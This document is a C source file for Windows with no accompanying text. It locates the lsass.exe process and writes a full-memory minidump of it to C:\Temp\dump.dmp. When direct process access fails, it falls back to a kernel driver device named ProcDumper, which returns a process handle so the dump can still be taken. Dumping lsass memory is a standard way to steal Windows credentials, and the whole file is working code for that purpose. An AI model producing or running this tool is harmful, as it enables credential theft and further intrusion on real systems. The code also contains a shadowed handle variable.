#include <Windows.h>
#include <stdio.h>
#include <minidumpapiset.h>
#include "defines.h"

#pragma comment(lib, "Dbghelp.lib")

#define IOCTL_DUMP_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _DUMP_PROCESS_INPUT
{
	ULONG ProcessId;
	HANDLE ProcessHandle;
} DUMP_PROCESS_INPUT, * PDUMP_PROCESS_INPUT;

DWORD findPid(LPCWSTR processName) {

	DWORD pid = 0;

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	if (!hNtdll) {
		wprintf(L"[-] Failed to get handle to ntdll.dll\n");
		return 0;
	}

	fnNtQuerySystemInformation NtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		wprintf(L"[-] Failed to get address of NtQuerySystemInformation\n");
		return 0;
	}

	NTSTATUS status;
	ULONG returnLength = 0;
	status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &returnLength);

	if (status != STATUS_INFO_LENGTH_MISMATCH) {
		wprintf(L"[-] NtQuerySystemInformation failed to get required buffer size\n");
		return 0;
	}

	PVOID buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLength);
	if (!buffer) {
		wprintf(L"[-] Failed to allocate memory for process information\n");
		return 0;
	}

	status = NtQuerySystemInformation(SystemProcessInformation, buffer, returnLength, &returnLength);

	if (!NT_SUCCESS(status)) {
		wprintf(L"[-] NtQuerySystemInformation failed\n");
		HeapFree(GetProcessHeap(), 0, buffer);
		return 0;
	}

	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
	while (TRUE) {
		if (pInfo->ImageName.Buffer && _wcsicmp(pInfo->ImageName.Buffer, processName) == 0) {
			pid = (DWORD)(ULONG_PTR)pInfo->UniqueProcessId;
			break;
		}

		if (pInfo->NextEntryOffset == 0) {
			break;
		}

		pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset);

	}

	HeapFree(GetProcessHeap(), 0, buffer);
	return pid;
}

int main(int argc, char* argv[])
{

	LPCWSTR processName = L"lsass.exe";

	DWORD pid = findPid(processName);

	if (pid == 0)
	{
		printf("[-] Process %ws not found.\n", processName);
		return 1;
	}

	printf("[+] Found process %ws with PID: %d\n", processName, pid);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	HANDLE hFile = CreateFileA(
		"C:\\Temp\\dump.dmp", 
		GENERIC_WRITE, 0, 
		NULL, 
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to create dump file. Error: %d\n", GetLastError());
		return 1;
	}

	if (hProcess != NULL)
	{
		if (!MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo | MiniDumpWithThreadInfo, NULL, NULL, NULL))
		{
			printf("[-] Failed to write dump file. Error: %d\n", GetLastError());
			return 1;
		}
	}
	else {

		PDUMP_PROCESS_INPUT procDump = (PDUMP_PROCESS_INPUT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DUMP_PROCESS_INPUT));

		if (procDump == NULL)
		{
			printf("[-] Failed to allocate memory for dump input. Error: %d\n", GetLastError());
			return 1;
		}

		procDump->ProcessId = pid;

		HANDLE hDevice = CreateFileW(
			L"\\\\.\\ProcDumper",
			GENERIC_READ | GENERIC_WRITE,
			0,
			NULL,
			OPEN_EXISTING,
			0,
			NULL
		);

		if (hDevice == INVALID_HANDLE_VALUE)
		{
			printf("[-] Failed to open device. Error: %d\n", GetLastError());
			return 1;
		}

		DWORD bytesReturned;
		BOOL success = DeviceIoControl(
			hDevice,
			IOCTL_DUMP_PROCESS,
			procDump,
			sizeof(DUMP_PROCESS_INPUT),
			procDump,
			sizeof(DUMP_PROCESS_INPUT),
			&bytesReturned,
			NULL
		);

		if (!success)
		{
			printf("[-] DeviceIoControl failed. Error: %d\n", GetLastError());
			return 1;
		}

		hProcess = procDump->ProcessHandle;

		HANDLE hProcess = NULL;
		HANDLE hCurrentProcess = GetCurrentProcess();

		if (DuplicateHandle(hCurrentProcess, procDump->ProcessHandle, hCurrentProcess, &hProcess, PROCESS_ALL_ACCESS, FALSE, DUPLICATE_CLOSE_SOURCE)) {
			printf("[+] Successfully duplicated handle: 0x%p\n", hProcess);
			if (!MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo | MiniDumpWithThreadInfo, NULL, NULL, NULL))
			{
				printf("[-] Failed to write dump file. Error: %X\n", GetLastError());
				return 1;
			}

		}
		else {
			printf("[-] Failed to duplicate handle. Error: %d\n", GetLastError());
			return 1;
		}

		
	}
	//else {
	//	printf("[-] Failed to open process. Error: %d\n", GetLastError());
	//	return 1;
	//}

}